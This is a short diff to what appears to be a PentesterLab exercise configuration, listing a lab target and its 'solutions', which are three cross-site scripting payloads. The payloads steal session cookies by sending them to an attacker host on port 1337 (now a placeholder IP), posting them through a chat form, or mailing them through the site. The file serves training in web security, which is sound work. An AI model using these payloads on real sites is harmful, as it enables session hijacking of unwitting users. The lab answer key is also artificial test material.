@@ -12,6 +12,6 @@
 :students:
   - http://mail.#PENTESTLAB-DOMAIN#/admin
 :solutions:
-  - <script>document.write("<img src='http://172.23.42.70:1337/"+document.cookie+"' />")</script>
+  - <script>document.write("<img src='http://#ATTACKER-IP#:1337/"+document.cookie+"' />")</script>
   - <script>if (!localStorage["donotsend"]){ document.getElementById("message").value=document.cookie;document.getElementById("chat").submit();localStorage["donotsend"] = true}</script>
   - <script>document.write("<img src='http://mail.#PENTESTLAB-DOMAIN#/new_mail.cgi?to=Alice&subject="+document.cookie+"&body=&newmail=Submit+Query' />")</script>
